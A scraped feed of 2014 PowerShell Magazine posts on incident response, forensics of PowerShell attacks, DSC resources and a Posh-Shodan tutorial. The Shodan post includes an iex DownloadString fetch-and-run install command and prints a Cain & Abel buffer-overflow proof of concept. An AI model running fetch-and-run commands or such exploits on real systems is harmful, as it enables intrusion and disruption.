_.\\analysis\\Meta_:\nGet-AllFileLengths.ps1\nGet-FileLengths.ps1\nUnlike most of the analysis scripts, these two don’t perform frequency analysis. But they are still useful for spotting outliers. You can run the first one to return a grid view window of all the collected Kansa output files and their lengths and the second one will return a grid view window of some specific collected files and their lengths. What’s useful about this? Recall the discussion about WMI Event Consumers? Below is the output of Get-FileLengths.ps1 –FileNamePattern *wmievtconsmr.xml:\nEach BaseName in the grid view window above contains the name of a fictitious system, followed by an underscore and an indicator of the data contained in the file, so these are WMI Event Consumers from many hosts, several thousand in this case. Simply sorting by file size is enough to find outliers. Analysis does not have to be complicated to be effective.\nIn the _.\\Analysis\\Net_ directory, you’ll find the following analysis scripts:\nGet-ARPStack.ps1\nGet-DNSCacheStack.ps1\nGet-NetstatForeign16sStack.ps1\nGet-NetstatForeign24sStack.ps1\nGet-NetstatListenerStack.ps1\nGet-NetstatStack.ps1\nGet-NetstatStackByProtoForeignIpStateComponentProcess.ps1\nGet-NetstatStackForeignIpPortProcess.ps1\nGet-NetstatStackForeignIpProcess.ps1\nThe purpose of each of these should be fairly apparent. Get-NetstatForeign16sStack.ps1 and Get-NetstatForeign24sStack.ps1 are useful for getting an idea of what networks your hosts may be communicating with. These scripts will likely need some editing for your environment as they currently make assumptions about internal networks using RFC1918 addresses. The 16 and 24 scripts, as you may guess, apply CIDR block notation and aggregate connections based on the first two and three ForeignAddress octets, this may not be the most accurate analysis, but it’s good for quick analysis.\nAnd lastly the analysis scripts in _.\\Analysis\\Process_:\nGet-HandleProcessOwnerStack.ps1\nGet-PrefetchListingLastWriteTime.ps1\nGet-PrefetchListingStack.ps1\nGet-ProcsWMICLIStack.ps1\nGet-ProcsWMICmdlineStack.ps1\nGet-ProcsWMISortByCreationDate.ps1\nGet-ProcsWMITempExePath.ps1\nGet-ProxSystemStartTime.ps1\nI won’t go into details on these as I think you can get an idea of what they do based on their names and if you want to know more about them, check out the project on GitHub.\nData collected and analyzed, next step: Remediation You’ve seen how Kansa can be used to collect and analyze data. If you were working a real security incident, at this point you may have a good understanding of your adversary, what backdoors they’ve planted, what processes they’ve injected into, what domains they are using for command and control (C2) and you may have figured out how they originally entered the environment.\nThe next thing to do is make sure the original vector is fixed so they can’t use it to come back, then you’ve got to carefully execute a very well-coordinated remediation plan. Remediation planning should take place in parallel with your investigation. As you find new adversary artifacts, someone on the team should be documenting how they will need to be remediated. Say you find evidence that the adversary has run a credential stealing tool on many hosts, you know that you should roll all passwords in the environment. If you’ve found C2, you may want to block access to it during remediation. For all the backdoors you’ve found, figure out how to remove them. You may have to wipe hard drives and completely re-install many systems or in a worst case scenario, completely forklift hardware.\nI have worked cases against red teams, however, where they used a fairly light touch, installing backdoors that could be easily removed, injecting into processes that could be stopped and restarted without impacting services. If you find yourself working a similar case, you can use Kansa for remediation.\nYou can write a PowerShell script to carry out remediation tasks – stopping rogue processes, removing persistence mechanisms, implementing host-level firewall rules to block C2, etc. Maybe you save this script as Get-Remediation.ps1, then you run the following command:\n.\\kansa.ps1 –ModulePath .\\Get-Remediation.ps1 –TargetList Owned –ThrottleLimit 100  Because you’re carrying out actions that likely won’t be returning any data, you may safely bump up the -ThrottleLimit allowing you to act quickly, ideally before your adversary has a chance to respond.\nWith round one of remediation completed, you’ll want to closely monitor your environment for any signs that the adversary is still active. There may be things you missed, like that web shell they planted, but never used and so the battle continues.\nI hope you’ve enjoyed this tour of Kansa and its capabilities. It’s been one of the most fun and rewarding personal projects I’ve undertaken. It scratches a personal itch, but I sincerely hope that others find it useful, as well. I hope you’ll check it out and please contribute, whether its code, bugs or feature requests.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/18/kansa-a-powershell-based-incident-response-framework/","tags":["infosec","security","Kansa","Modules"],"title":"Kansa: A PowerShell-based incident response framework"},{"categories":["News","PowerShell DSC"],"contents":"Windows PowerShell team released DSC Resource Kit Wave 5.\nThis wave has added the following\n xWordPress: This module contains two resources, xIISWordPressSite and xWordPressSite, as well as example configurations under Samples, which show end-to-end deployment of the common WordPress site. xPhp: This DSC resource allows you to set up PHP in IIS. This is used in the xWordPress examples. xMySql: This module includes 5 resources that allow you to set up a MySQL Server, Database, User, and create a Grant for the user. This is used in the WordPress examples. xPsDesiredStateConfiguration now includes xWindowsOptionalFeature. This resource allows configuring Windows Optional Features for Windows client SKUs. xWebAdministration has added xIisModule, which enables registration of modules (such as FastCgiModules) with IIS. xWindowsUpdate: This module actually went live just after Wave 4, so it missed the announcement of the Reskit. It contains the xHotfix resource, which handles installation of a Windows update (or a hotfix) from a given path (file path or a URI).  There are a total 77 resources in the DSC resource kit. Some of these new resources require Windows Management Framework (WMF) 5.0 Experimental Release July 2014.\n This release of WMF 5.0 is an experimental release made available only for the DSC resources. The other functionality which was a part of WMF 5.0 May 2014 release may not have been updated and still in the early stages. DO NOT consider this as a WMF 5.0 Preview release.\n Windows Management Framework (WMF) 5.0 Experimental Release July 2014 is available only for Windows Server 2012 R2 and Windows 8.1 operating systems.\nGo ahead and explore the new resources! ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/18/dsc-resource-kit-wave-5-is-available/","tags":["PowerShell DSC","News"],"title":"DSC Resource Kit Wave 5 is available"},{"categories":["infosec","security"],"contents":"We often see the offensive capabilities of PowerShell hit the headlines as it is more attractive. It’s good to know and see what attackers do to penetrate your network, execute code to remain undetected, move laterally, and steal administrative credentials. Scary? Paradoxically malicious code cannot hide as it needs to run. What can you do to protect yourself, your environment, critical assets and your business? The preparation phase of incident response is a key element in your defense.\nFirst you should consider building barriers with multiple layers to prevent incidents to happen. How?\nYou should plan carefully the configuration of your environment to slow down attackers and limit the attack surface. You should also know your environment.\n  You should be able to build a whitelist of known good files. The built-in Get-FileHash cmdlet, introduced in PowerShell 4.0, can help.\nGet-FileHash C:\\Windows\\system32\\ntoskrnl.exe   Have network segmentation, enable and configure firewalls not only at the edge of your perimeter but also on workstations. You can use Group Policies to deploy firewall rules or the built-in *- NetFirewall* cmdlets from the NetSecurity module.\n  Get-Command -Module NetSecurity   Start to apply the least privilege principle by not turning off UAC (User Account Control) and let your users run their session with administrative privileges. If they run as standard users, the attacker will first have to trigger an elevation of privileges to gain administrative privileges.\n Sign your code with a certificate so that you don’t have to lower the default execution policy of PowerShell. You can also use a Group Policy and Set-AuthenticodeSignature cmdlet.  Get-Help about_Execution_Policies  Whitelist what can be run. If you have Applocker, you should definitely leverage that control. PowerShell has a built-in Applocker module since version 2.0.  Get-Command -Module Applocker If you’ve signed your code, you can use Publisher-based rules in Applocker:\n  Deploy an audit policy to be able to collect and monitor events.\n  Consider using the JEA (Just Enough Admin) kit to ease the deployment of WinRM constrained endpoints\n  Etc…\nWhile focused on PowerShell, there are other defenses that you should implement (like a deploying an Antivirus, EMET (Enhanced Mitigation Toolkit)… Please also note that the above list is far from being exhaustive and that these controls can be bypassed, defeated… \nHaving good defense in your “fortress“ isn’t enough as it can be breached from the inside.\nZero-day or unknown vulnerabilities still exist but it’s more likely that your users will be targeted as they are the weakest point in your environment even if you have the best security trainings and awareness campaigns. So, you should assume breach and that your Antivirus product won’t recognize the threat. How do you defend yourself in this case?\nThe second key element in the preparation phase for incident response is that you should consider building the capability to quickly respond to incidents.\nYou should have a process where you can quickly run code to hunt for malicious activity in your environment. To spot the malicious activity, you should first know what normal activity look like.\nTo quickly run code, you can leverage both PowerShell remoting and workflows introduced in PowerShell 3.0 to parallelize the workload. An alternative to workflows are runspaces.\nCan I do live incident response with PowerShell? Of course. The SANS published a white paper on Live Response using PowerShell. PowerShell MVP Matt Graeber also developed some tools to help us do live memory analysis.\nYou can also track indicators of compromise that uses persistence in the registry. A traditional well-known tool for this purpose is autoruns.exe from Sysinternals.\nTo demonstrate what can be done to investigate malware persistence, I wrote a PowerShell function that will go through the 192 launch points. You can find the code here.\nGet-PSAutoRun uses the same categories as autoruns.exe: Logon, Explorer Add-ons, Scheduled Tasks, Services, Drivers, Codecs, LSA Providers,… just to name a few.\nYou can choose to either get everything using the -All parameter:\nGet-PSAutorun -All | Format-Table -Property Path,ImagePath,Category  or specify a list of switches that match one or more categories:\nGet-PSAutorun -Logon -LSAsecurityProviders | Format-Table -Property Path,ImagePath,Category  Whenever you specify the -All parameter, any specific category you mentioned is ignored allowing to return all autoruns.\nThere are also two additional parameters that you may leverage when investigating malware persistence. You may want to get MD5, SHA1 and SHA2 hashes of files and know whether they are digitally signed or not.\nGet-PSAutorun -All -ShowFileHash -VerifyDigitalSignature  You get the MD5, SHA1 and SHA256 properties when you specify the -ShowFileHash parameter and the Signed property with the -VerifyDigitalSignature parameter.\nWhat’s next? Malware persistence isn’t the only thing to look at. You should check for files like the hosts file in C:\\Windows\\system32\\drivers\\etc\\ being hijacked. You should look for recent suspicious events in the logs like the “audit log was cleared”. You can also check if the firewall is on and if the rules enabled match what is in your baseline of known good rules.\nAll this post-mortem controls aren’t enough to keep the bad guys out of your network if you don’t have a good patch management policy in place to fix known vulnerabilities in the operating system and all your applications. You can find a list of 20 Critical Security Controls for Effective Cyber Defense on this page: http://www.sans.org/critical-security-controls.\nMy wish for the future: I’d like to see more people sharing code about how they defend their network or write PowerShell code for forensics and live incident response.\n    ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/17/live-incident-response-with-powershell/","tags":["infosec","security"],"title":"Live Incident Response with PowerShell"},{"categories":["Infosec","Security"],"contents":"“Huh, that’s weird. Look at this system. I think the attacker used PowerShell.” It was late summer 2012, and we were working on an incident response investigation for a Fortune 100 technology company compromised by an intruder attempting to steal intellectual property. The evidence wasn’t terribly exciting: just a simple reconnaissance script to enumerate domain users and systems. But it was an anomaly – or at least, a rare occurrence within the scope of our previous case work. We conduct hundreds of incident response investigations every year, most of which involve targeted attacks for the purposes of espionage, stealing intellectual property, or theft of financial data. Attacker tools, tactics, and procedures regularly change and evolve – and PowerShell was a new wrinkle.\nFast forward almost two years later. Stories of PowerShell usage in both targeted compromises and opportunistic malware are hitting infosec media with alarming frequency. We also see these trends in our daily casework: an increasing number of investigations involve attacker reconnaissance, command execution, or data theft facilitated by PowerShell. Just a few months ago, we responded to a case where the attacker evolved from relying on custom tools and PsExec, to exclusive use of PowerShell remoting, for lateral movement and command-and-control (and thereby evaded detection for many months). The gap between attackers’ PowerShell skills, and organizations’ ability to detect and respond to its misuse, is growing.\nPrior articles by Matthew Graeber, Joseph Bialek, and Will Schroeder did a great job of explaining why PowerShell is so dangerous in the hands of an attacker – particularly given elevated privileges during the post-exploitation phase of an incident. It provides:\n A built-in mechanism for remote command execution The ability to execute malicious code without ever touching disk The ability to evade many Anti-Virus and Intrusion Prevention Systems Full access to WMI and .NET Framework  The unauthorized use of PowerShell presents several challenges to forensic analysts and system administrators alike:\n As a legitimate component of Windows, PowerShell execution does not necessarily indicate malicious behavior. PowerShell 2.0 does not provide a practical mechanism for detailed (e.g. per-command) auditing. PowerShell 3.0 and later provides comprehensive module logging – but is only installed by default on Windows 8 or Server 2012, which remain uncommon in many corporate environments. PowerShell remoting sessions occur in ephemeral process memory with few-to-no persistent artifacts. Many system administrators and security professionals remain unfamiliar with PowerShell and its management or security controls.  Faced with these mounting challenges, we decided to research the forensic “footprints” left behind by the ways that an attacker might use PowerShell – a topic for which publicized information is scarce. Our work focused on three fundamental scenarios: local PowerShell execution, PowerShell remoting, and the configuration of a persistent PowerShell backdoor through the use of WMI. We examined multiple sources of evidence, including the registry, file system, event logs, process memory, and network traffic.\nUnfortunately, we never found the “white whale” – a single source of evidence, consistently available across all versions of Windows and PowerShell, that provides a complete history of all activity on an endpoint regardless of how it occurs. However, we did identify multiple artifacts containing tidbits of information that, when combined, can solve common investigative questions.\nIn the upcoming weeks, we’ll be releasing a whitepaper and presentation at Black Hat USA and DEF CON that focuses on the forensic analysis portion of our research. However, in this article we wanted to share a corollary of our findings – the sources of evidence that are best suited for establishing a baseline and monitoring a Windows enterprise environment.\nAs alluded to by Microsoft in their recent update to the Mitigating Pass-the-Hash whitepaper, organizations should orient their detection and prevention efforts around the assumption that a breach has occurred. More specifically, that means assuming that an attacker has successfully compromised credentials that provide local administrator-equivalent access to targeted system(s) (if not domain administrator outright). The worst-case scenario is unfortunately the reality for the majority of Windows environments that we encounter during investigations. Any security control put in place to limit the use of PowerShell – be it the execution policy, disabled remoting, or constrained endpoints, may be bypassed altogether.\nInstead of depending on these settings to prevent malicious usage of PowerShell, we recommend using them to establish a baseline of normal activity in an environment. Deviations from this baseline may serve as an indication of attacker activity. We recommend that organizations formulate a PowerShell monitoring strategy by first assessing and enumerating the following:\n Which servers/server groups are administered via PowerShell remoting? By local PowerShell script execution? What about workstations/end-user systems? Which domain accounts use PowerShell remoting? What are the source hostnames from which these users would administer systems? What are the names and common directories used for legitimate PowerShell scripts within the environment? Are legitimate scripts used by the organization digitally signed? Are any systems configured to automatically load and execute PowerShell scripts for maintenance or administration purposes?  Once complete, administrators can rely on centralized Windows event log forwarding and collection (for at-scale monitoring) or local event log analysis (for targeted forensics and investigations) to identify signs of anomalous PowerShell usage. This effort will require filtering and tuning – that’s where having a baseline, or even monitoring a subset of known-good systems with common configuration for a period of time, can help.\nIn the interest of providing recommendations applicable to all versions of PowerShell, inclusive of 2.0, we recommend evaluating the following log sources and events:\n  Windows PowerShell event log entries indicating the start and stop of PowerShell activity:\n Event ID 400 (“Engine state is changed from None to Available”), upon the start of any local or remote PowerShell activity. Event ID 600 referencing “WSMan” (e.g. “Provider WSMan Is Started”), indicating the onset of PowerShell remoting activity on both source and destination systems. Event ID 403 (“Engine state is changed from Available to Stopped”), upon the end of the PowerShell activity.    System event log entries indicating a configuration change to the Windows Remote Management service:\n Event ID 7040 “The start type of the Windows Remote Management (WS-Management) service was changed from [disabled / demand start] to auto start.” – recorded when PowerShell remoting is enabled. Event ID 10148 (“The WinRM service is listening for WS-Management requests”) – recorded upon reboot on systems where remoting has been enabled.    WinRM Operational event log entries indicating authentication prior to PowerShell remoting on an accessed system:\n Event ID 169 (“User [DOMAIN\\Account] authenticated successfully using [authentication_protocol]”)    Security event log entries indicating the execution of the PowerShell console or interpreter:\n Event ID 4688 (“A new process has been created”) – includes account name, domain, and executable name in the event message.    AppLocker event log entries recording the local execution of PowerShell scripts. We recommend enabling AppLocker in audit mode across an environment for this specific purpose. Upon script execution in audit mode, the AppLocker MSI and Script Event Log may record:\n Event ID 8006 (“[script_path] was allowed to run but would have been prevented from running if the AppLocker policy were enforced”) Event ID 8005 (“[script_path] was allowed to run”).    Both of these events will include the user account that attempted to execute a script.\nWe fully expect that threat actors will continue to employ more sophisticated PowerShell techniques and improve their counter-forensic strategies over time. It is our hope that our work will increase awareness of these attacks, motivate organizations to enhance their detection and monitoring capabilities, and drive additional research. We look forward to sharing further details in our forthcoming whitepaper and presentations at Black Hat USA and DEF CON.\nAuthors are Ryan Kazanciyan and Matt Hastings.\nRyan Kazanciyan is a Technical Director with Mandiant and has eleven years of experience in incident response, forensic analysis, and penetration testing. Since joining Mandiant in 2009, he has led investigation and remediation efforts for dozens of Fortune 500 organizations, focusing on targeted attacks, industrial espionage, and financial crime.\nMatt Hastings is a Consultant with Mandiant, a division of FireEye, Inc. Based in the Washington D.C area, Matt focuses on enterprise-wide incident response, high-tech crime investigations, penetration testing, strategic corporate security development, and security control assessments; working with the Federal government, defense industrial base, financial industry, Fortune 500 companies, and global organizations.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/","tags":["Infosec","Security"],"title":"Investigating PowerShell Attacks"},{"categories":["infosec","security","Modules","PoshShodan"],"contents":"What is Shodan? Shodan is a search engine that lets one find hosts on the internet using a variety of filters. The search engine is constantly scanning and updating its database providing the user with an ability to discover all kinds of hosts (routers, computers, access points, printers, etc.) connected to the public internet. Specifying filters like banners, port numbers, geo locations and others, Shodan becomes a very important tool for admins of a large web presence, pentesters, researchers, and auditors.\nWhy I Wrote the Module In my day-to-day job researching vulnerabilities, their impact and identifying what is out there is of great importance. Also in my side work of writing security tools being able to know real world data in terms of exposure and to be able to measure, parse and quantify the data becomes even more important and PowerShell is one of the best tools out there to help me through my workflow of finding and filtering information.\nRequirement for Use The free service itself provides access only to a subset of the information. To be able to get access to all features one needs to use their API. Before installing the module it should be clear that the API access to the service is a paid one with different levels of amount of data one can access in a month and the level of support. When one purchases the REST API access, the access is provided through an API key that is used with all requests. At this moment there are 3 pricing schemes to choose from:\n Freelancer: $19/ month Small Business: $99/ month Enterprise: $499/ month  Each of them provides increased levels of access, from 1 million results/month for Freelancer up to completely unlimited access to the REST API at the Enterprise plan. One can purchase an API key at https://developer.shodan.io/\nInstalling the Module Before installing a module, make sure you are running PowerShell 3.0 or later since the module is using features introduced in PowerShell 3.0. The module is currently hosted on GitHub and can be installed directly from it by invoking the command shown in the project page.\niex (New-Object Net.WebClient).DownloadString(\"https://gist.githubusercontent.com/darkoperator/9378450/raw/7244d3db5c0234549a018faa41fc0a2af4f9592d/PoshShodanInstall.ps1\")  The installation process will download the latest version of the master branch, unlock the .zip file, decompress and install files in the user’s profile module path. After the installation is finished it will load the module for you and show the commands available.\nPS\u0026gt; iex (New-Object Net.WebClient).DownloadString(\u0026quot;https://gist.githubusercontent.com/darkoperator/9378450/raw/7244d3db5c0234549a018faa41fc0a2af4f9592d/PoshShodanInstall.ps1\u0026quot;) Downloading latest version of Posh-Shodan from https://github.com/darkoperator/Posh-Shodan/archive/master.zip. File saved to C:\\Users\\Carlos\\AppData\\Local\\Temp\\Posh-Shodan.zip Uncompressing the Zip file to C:\\Users\\Carlos\\Documents\\WindowsPowerShell\\Modules Renaming folder Module has been installed CommandType Name ModuleName ----------- ---- ---------- Function Get-ShodanAPIInfo Posh-Shodan Function Get-ShodanDNSResolve Posh-Shodan Function Get-ShodanDNSReverse Posh-Shodan Function Get-ShodanHostServices Posh-Shodan Function Get-ShodanMyIP Posh-Shodan Function Get-ShodanServices Posh-Shodan Function Measure-ShodanExploit Posh-Shodan Function Measure-ShodanHost Posh-Shodan Function Read-ShodanAPIKey Posh-Shodan Function Search-ShodanExploit Posh-Shodan Function Search-ShodanHost Posh-Shodan Function Set-ShodanAPIKey Posh-Shodan If you are running PowerShell 5.0 (Community Tech Preview (CTP) is available at the time this article is written) you can use the PowerShellGet module to install the module. We can search for it using the Find-Module cmdlet.\nPS\u0026gt; Find-Module posh-shodan | fl Name : Posh-Shodan Version : 1.0 Description : Module for interacting with the Shodan service at http://www.shodanhq.com/ given a developer API key. Author : Carlos Perez \u0026amp;lt;carlos_perez@darkoperator.com CompanyName : Copyright : (c) 2014 Carlos Perez \u0026amp;lt;carlos_perez@darkoperator.com. All rights reserved. LicenseUri : ProjectUri : IconUri : Tag : {Shodan} ReleaseNotes : DateUpdated : 7/4/2014 7:15:45 AM RequiredModules : DownloadUri : https://msconfiggallery.cloudapp.net/api/v2/package/Posh-Shodan/1.0.0 Hash : ogCPvmkGiczS3vR93p+4la+gxzfacHHd3CqMsJCyDaKWl1LCqMCk0+pSrGN9Ua9zH8NQyhRNLYzfnJB6aKRYzg== HashAlgorithm : SHA512 SourceUri : https://go.microsoft.com/fwlink/?LinkID=397631\u0026amp;clcid=0x409 SourceType : PSGallery You will be able to see the version and update information. To install you can just run the Install-Module cmdlet from a PowerShell session running as administrator.\nPS C:\\\u0026gt; Install-Module -Name posh-shodan -Verbose  Initial Setup After installation, if you have an API key from Shodan you can start using the module immediately specifying the API key in all commands when performing the query. Another method is to save the key encrypted with a master password so that we don’t have to look for the key every time when it’s needed. To save our key we use the command Set-ShodanAPIKey to set the API key and encrypt it to disk with the master password:\nPS C:\\\u0026gt; Set-ShodanAPIKey -APIKey 238784665352425277288393 -MasterPassword (Read-Host -AsSecureString)  The key is now saved in a secure manner on disk and set as the key for use for all other commands. The key is saved in an encrypted file in your APPDATA directory.\nPS\u0026gt; ls $env:APPDATA\\Posh-Shodan Directory: C:\\Users\\Carlos\\AppData\\Roaming\\Posh-Shodan Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 3/4/2014 11:20 AM 194 api.key For loading a stored key after opening a new session just issue the command to read the key with you master password. You need to specify the password as a secure string to provide the necessary protections to it when it’s stored in memory. This is why it is a bad practice to use a password as a string in your advanced functions or cmdlets.\nRead-ShodanAPIKey -MasterPassword (Read-Host -AsSecureString)  Once the key is loaded into memory we can see information on our specific key using the Get-ShodanAPIInfo command.\nPS\u0026gt; Get-ShodanAPIInfo Unlocked_Left : 97 Telnet : True Plan : dev HTTPS : True Unlocked : True We can also see a list of services Shodan recognizes and are available for search with Get-ShodanService command:\nPS\u0026gt; Get-ShodanService 623 : IPMI 9151 : Tor control port 9200 : ElasticSearch 5985 : WinRM 2.0 HTTP 32764 : Router backdoor 9100 : Printer Job Language 7071 : Zimbra HTTP 9999 : Telnet (Lantronix) 1911 : Tridium Fox 137 : NetBIOS 110 : POP3 11211 : MemCache 8443 : HTTPS (8443) 3306 : MySQL 9051 : Tor control port 80 : HTTP 81 : HTTP (81) 119 : NNTP 1900 : UPnP 5060 : SIP 2323 : Telnet (2323) 25 : SMTP 47808 : BACnet 5353 : mDNS 21 : FTP 22 : SSH 23 : Telnet 9160 : Cassandra 5560 : Oracle HTTP 3790 : Metasploit HTTPS 44818 : EtherNetIP 3389 : RDP 7777 : Oracle HTTP (7777) 465 : SMTP (465) 5900 : VNC 8089 : Splunk HTTPS 502 : Modbus 995 : POP3 + SSL 5432 : PostgreSQL 5001 : Synology 5000 : Synology 771 : RealPort 143 : IMAP 993 : IMAP + SSL 992 : Telnet + SSL 443 : HTTPS 2628 : Dictionary 9943 : Pipeline Pilot (HTTPS) 1434 : MS-SQL Monitor 445 : SMB 8333 : Bitcoin 123 : NTP 8129 : Snapstream 20000 : DNP3 102 : Siemens S7 389 : LDAP 6000 : X Windows 8000 : Qconn 161 : SNMP 79 : Finger 9981 : HTS/ tvheadend 11 : Systat 13 : Daytime 15 : Netstat 1023 : Telnet (1023) 17 : Quote of the day 5632 : PC Anywhere 27017 : MongoDB 5986 : WinRM 2.0 HTTPS 1723 : PPTP 53 : DNS 4911 : Tridium Fox + SSL 6379 : Redis 1471 : Hak5 Pineapple 9944 : Pipeline Pilot (HTTP) 8834 : Nessus HTTPS 8080 : HTTP (8080) 28017 : MongoDB HTTP 2067 : DLSW Searching Hosts with Shodan The power of Shodan comes from its ability of searching for hosts with a rich set of filters. The list of filters is so big, so a few conceptual help topics exist to help you understand them better.\nPS\u0026gt; help about_shodan | fl Name : about_Shodan_Host_Search_Facets Category : HelpFile Synopsis : Describes the search facets that can be used when performing a search for Component : Role : Functionality : Length : 3054 Name : about_Shodan_Host_Search_Filters Category : HelpFile Synopsis : Describes the search filters that can be used when performing a search for Component : Role : Functionality : Length : 2633 The command we would use to perform the searches is Search-ShodanHost. We have to be careful since–depending on what subscription we paid for–we have a limited numbers of searches we can perform with the credits we have. To avoid consuming all available searches we may choose to use the Measure-ShodanHost command has the same options as the Search-ShodanHost command but it does not consumes credits and returns the total count of results it found. If your search returns more than 100 results it counts against the amount of searches you are allowed to make. By using the Measure-ShodanHost command you can check if one will be consumed or not.\nThe facet option and its filters allow us to group information depending on the filter given. The use of the facets comes in handy when quantifying or trying to detect a pattern in the results. More on the options can be seen in the contextual help about_Shodan_host_Search_Facets. For both Search-ShodanHost and Measure-ShodanHost facet names can be in the format of “property:count”, where “count” is the number of facets that will be returned for a property (i.e. “country:100” to get the top 100 countries for a search query).\nLet’s see what kind of results I can get by searching for Cisco devices that do not require authentication; I will use a friend’s IP range for the company he runs (I did got permission to use it as an example and vulnerability has been closed and info anonymized):\nPS\u0026gt; Measure-ShodanHost -Query \u0026quot;cisco-ios last-modified\u0026quot; -Net \u0026quot;192.168.1.1/24\u0026quot; -City \u0026quot;San Juan\u0026quot; Total : 1 Facets : Seems we found one result for the specified network range. Let’s perform the actual search.\nPS\u0026gt; Search-ShodanHost -Query \u0026quot;cisco-ios last-modified\u0026quot; -Net \u0026quot;192.168.1.1/24\u0026quot; -City \u0026quot;San Juan\u0026quot; Total Matches Facets ----- ------- ------ 1 {@{product=Cisco IOS http config; os=... Let’s save the results to a variable and look at what matched.\nPS\u0026gt; $res = Measure-ShodanHost -Query \u0026quot;cisco-ios last-modified\u0026quot; -Net \u0026quot;192.168.1.1/24\u0026quot; -City \u0026quot;San Juan\u0026quot; PS\u0026gt; $res.matches | select -First 1 product : Cisco IOS http config os : title : timestamp : 2014-07-12T04:56:33.323593 isp : AT\u0026amp;T cpe : o:cisco:ios asn : AS3141 hostnames : {} location : @{city=San Juan …} ip :12345 domains : {} org : My Friends Org data : HTTP/1.0 200 OK Date: Sat, 20 Mar 1993 15:42:45 GMT Server: cisco-IOS Connection: close Transfer-Encoding: chunked Content-Type: text/html Expires: Sat, 20 Mar 1993 15:42:45 GMT Last-Modified: Sat, 20 Mar 1993 15:42:45 GMT Cache-Control: no-store, no-cache, must-revalidate Accept-Ranges: none port : 443 ip_str : 192.168.1.1 If we want to see more information about the host (e.g. open ports), we can use the Get-ShodanHostService command and give it the IP address. If we connect to the device we can see it is vulnerable and after doing the command “show run” I could see it controlled OSPF and BGP routes for the organization putting me in a position to disrupt or intercept traffic.\nSearching for Exploits Shodan also allows us to search for publicly known exploits filtering by:\n BID ID (Bugtraq ID) from http://www.securityfocus.com/vulnerabilities CVE ID (Common Vulnerabilities and Exposure) from https://cve.mitre.org/ OSVDB ID (Open Source Vulnerability Database) from http://osvdb.org/ Microsoft Bulletin Type (Remote, Local, DOS) Port Platform  Just like searching for hosts we have a command to measure how many results we will get that does not count against the amount of searches we can perform. Let’s look for exploits against RDP on Windows.\nPS\u0026gt; $RDPExploits = Search-ShodanExploit -Query RDP -Platform windows PS\u0026gt; $RDPExploits Total Matches Facets ----- ------- ------ 10 {@{code=source: http://www.securityfo... PS\u0026gt; $RDPExploits.matches | group -Property type Count Name Group ----- ---- ----- 4 dos {@{code=source: http://www.securityfocus.com/bid/3445/info... 2 exploit {@{code=##... 3 local {@{code=#!/usr/bin/perl... 1 remote {@{code=2X Client for RDP 10.1.1204 ClientSystem Class ActiveX Control ... When you look at one of the matches you will see it will include the source code for the exploit if it’s available in addition to other metadata.\nPS\u0026gt; $RDPExploits.matches[2] code : # exploit.py ########################################################## # Cain \u0026amp; Abel v4.9.23 (rdp file) Buffer Overflow PoC # (other versions may also affected) # By:Encrypt3d.M!nd # encrypt3d.blogspot.com # # Greetz:-=Mizo=-,L!0N,El Mariachi,MiNi SpIder ########################################################## # # Description: # When Using Remote Desktop Password Decoder in Cain and # Importing \u0026quot;.rdp\u0026quot; file contains long Chars(ex:8250 chars) # The Program Will crash.And The Following Happen: # # EAX:41414141 ECX:7C832648 EDX:41414142 EBX:00000000 # ESP:0012BCD4 EBP:0012BCD4 ESI:001F07A8 EDI:00000001 # EIP:7E43C201 USER32.7E43C201 # # Access violation When Reading [41414141] # # And Also The Pointer to next SEH record and SE Handler # Will gonna BE Over-wrote # # This Poc Will Gonna Overwrite the Pointer to next SEH # With\u0026quot;42424242\u0026quot; and The SE Handler with\u0026quot;43434343\u0026quot; # ########################################################## chars = \u0026quot;A\u0026quot;*8194 ptns = \u0026quot;B\u0026quot;*4 shan = \u0026quot;C\u0026quot;*4 chars2 = \u0026quot;A\u0026quot;*200 exp=open('cain.rdp','w') exp.write(chars+ptns+shan+chars2) exp.close() # milw0rm.com [2008-11-30] description : Cain \u0026amp; Abel 4.9.23 (rdp file) Buffer Overflow PoC author : Encrypt3d.M!nd _id : 7297 source : ExploitDB platform : windows date : 2008-11-30T00:00:00+00:00 cve : {2008-5405} type : dos port : 0 The module should prove useful for security professionals in both red and blue team activities.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/15/posh-shodan-module-for-the-shodan-service/","tags":["infosec","security","Modules","PoshShodan"],"title":"Posh-Shodan module for the Shodan service"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nBy leveraging engine events and PowerShell profile scripts we can automatically persist command history to disk, and import it in the next session.\nThis is the code you can add to your PowerShell profile script:\n$PSHistoryPath = Join-Path (Split-Path -Path $profile -Parent) 'PS-History.csv' if (Test-Path -Path $PSHistoryPath) { Import-Csv -Path $PSHistoryPath | Add-History } Register-EngineEvent -SupportEvent PowerShell.Exiting -Action { Get-History -Count 25 | Export-Csv -Path $PSHistoryPath } The code in the action block of Register-EngineEvent will be run when PowerShell exits. New in PowerShell 4.0 and later is that the event also is triggered when you exit the PowerShell host by using “Close Window” or the “X”-button. In earlier versions the event was triggered only when using the exit command. The –SupportEvent parameter hides the subscription. Without this parameter, the subscription would be visible when running both Get-Job and Get-EventSubscriber, and we do not want to clutter the session with a profile supporting event.\nIn the above code we are persisting the last 25 items in the history. You can obviously edit or remove this number, but I would recommend to set a limit in order to not get a history that is too long. Remember that the history from the previous session is imported, thus over time the history will become very large if we do not configure a limit during history export.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/14/pstip-automatically-persist-history/","tags":["Tips and Tricks"],"title":"#PSTip Automatically persist history"},{"categories":["infosec","security","Modules","Veil-PowerView"],"contents":"I was led to PowerShell in the past few years as it began to rise to prominence in the information security community. As a penetration tester and red teamer for Veris Group’s Adaptive Threat division, my job depends on keeping abreast of current attack tools, tactics, techniques and procedures, and PowerShell is definitely the ‘new hotness’ in infosec. It’s been gaining traction ever since the seminal DefCon 18 talk PowerShell OMFG given by Dave Kennedy and Josh Kelly in 2010, and an increasing number of attack toolsets, public and private, have been ported to the language. To clarify, PowerShell does not help attackers actively exploit or compromise systems, but it does assist with the phase of the 